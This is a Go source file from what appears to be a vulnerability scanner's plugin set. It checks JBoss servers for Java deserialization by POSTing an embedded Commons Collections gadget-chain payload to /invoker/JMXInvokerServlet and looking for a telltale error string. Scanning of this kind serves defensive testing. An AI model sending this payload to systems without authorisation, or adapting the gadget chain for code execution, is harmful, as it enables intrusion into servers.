package scripts

import (
	"bytes"
	"github.com/jweny/pocassist/pkg/cel/proto"
	"github.com/jweny/pocassist/pkg/util"
	"github.com/valyala/fasthttp"
)

// JBossJavaSerializationVul jboss 序列化
func JBossJavaSerializationVul(args *ScriptScanArgs) (*util.ScanResult, error) {
	var jbossJavaSerializationPayload = "\xac\xed\x00\x05sr\x002sun.reflect.annotation.AnnotationInvocationHandlerU\xca\xf5\x0f\x15\xcb~\xa5\x02\x00\x02L\x00\x0cmemberValuest\x00\x0fLjava/util/Map;L\x00\x04typet\x00\x11Ljava/lang/Class;xps}\x00\x00\x00\x01\x00\rjava.util.Mapxr\x00\x17java.lang.reflect.Proxy\xe1'\xda \xcc\x10C\xcb\x02\x00\x01L\x00\x01ht\x00%Ljava/lang/reflect/InvocationHandler;xpsq\x00~\x00\x00sr\x00*org.apache.commons.collections.map.LazyMapn\xe5\x94\x82\x9ey\x10\x94\x03\x00\x01L\x00\x07factoryt\x00,Lorg/apache/commons/collections/Transformer;xpsr\x00:org.apache.commons.collections.functors.ChainedTransformer0\xc7\x97\xec(z\x97\x04\x02\x00\x01[\x00\riTransformerst\x00-[Lorg/apache/commons/collections/Transformer;xpur\x00-[Lorg.apache.commons.collections.Transformer;\xbdV*\xf1\xd84\x18\x99\x02\x00\x00xp\x00\x00\x00\x05sr\x00;org.apache.commons.collections.functors.ConstantTransformerXv\x90\x11A\x02\xb1\x94\x02\x00\x01L\x00\tiConstantt\x00\x12Ljava/lang/Object;xpvr\x00\x10java.lang.Thread\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00xpsr\x00:org.apache.commons.collections.functors.InvokerTransformer\x87\xe8\xffk{|\xce8\x02\x00\x03[\x00\x05iArgst\x00\x13[Ljava/lang/Object;L\x00\x0biMethodNamet\x00\x12Ljava/lang/String;[\x00\x0biParamTypest\x00\x12[Ljava/lang/Class;xpur\x00\x13[Ljava.lang.Object;\x90\xceX\x9f\x10s)l\x02\x00\x00xp\x00\x00\x00\x01ur\x00\x12[Ljava.lang.Class;\xab\x16\xd7\xae\xcb\xcdZ\x99\x02\x00\x00xp\x00\x00\x00\x00t\x00\x0egetConstructoruq\x00~\x00\x1d\x00\x00\x00\x01vq\x00~\x00\x1dsq\x00~\x00\x16uq\x00~\x00\x1b\x00\x00\x00\x01uq\x00~\x00\x1b\x00\x00\x00\x00t\x00\x0bnewInstanceuq\x00~\x00\x1d\x00\x00\x00\x01vq\x00~\x00\x1bsq\x00~\x00\x16uq\x00~\x00\x1b\x00\x00\x00\x01sr\x00\x11java.lang.Integer\x12\xe2\xa0\xa4\xf7\x81\x878\x02\x00\x01I\x00\x05valuexr\x00\x10java.lang.Number\x86\xac\x95\x1d\x0b\x94\xe0\x8b\x02\x00\x00xp\xff\xff\xff\xfft\x00\x04joinuq\x00~\x00\x1d\x00\x00\x00\x01vr\x00\x04long\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00xpsq\x00~\x00\x11sq\x00~\x00*\x00\x00\x00\x01sr\x00\x11java.util.HashMap\x05\x07\xda\xc1\xc3\x16`\xd1\x03\x00\x02F\x00\nloadFactorI\x00\tthresholdxp?@\x00\x00\x00\x00\x00\x0cw\x08\x00\x00\x00\x10\x00\x00\x00\x00xxvr\x00\x1ejava.lang.annotation.Retention\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00xpq\x00~\x006"

	// 定义报文列表
	var respList []*proto.Response

	fastReq := fasthttp.AcquireRequest()
	defer fasthttp.ReleaseRequest(fastReq)
	fastReq.Header.SetMethod(fasthttp.MethodPost)
	fastReq.Header.SetContentType("text/html")

	fastReq.Header.Set("Accept-Encoding", "identity")
	fastReq.Header.Set("Accept-Language", "zh-CN,zh;q=0.8")
	fastReq.Header.Set("Accept-Charset", "GBK,utf-8;q=0.7,*;q=0.3")
	fastReq.Header.Set("Connection", "keep-alive")
	fastReq.Header.Set("Referer", ConstructUrl(args, "/"))
	fastReq.Header.Set("Cache-Control", "max-age=0")
	fastReq.SetBody([]byte(jbossJavaSerializationPayload))

	rawUrl := ConstructUrl(args, "/invoker/JMXInvokerServlet")
	resp, err := util.DoFasthttpRequest(fastReq, true)

	if err != nil {
		util.ResponsePut(resp)
		return nil, err
	}

	if bytes.Contains(resp.Body, []byte("timeout value is negative")) {
		respList = append(respList, resp)
		return util.VulnerableHttpResult(rawUrl,"", respList),nil
	}
	return &util.InVulnerableResult, nil
}

func init() {
	ScriptRegister("poc-go-jboss-serialization", JBossJavaSerializationVul)
}
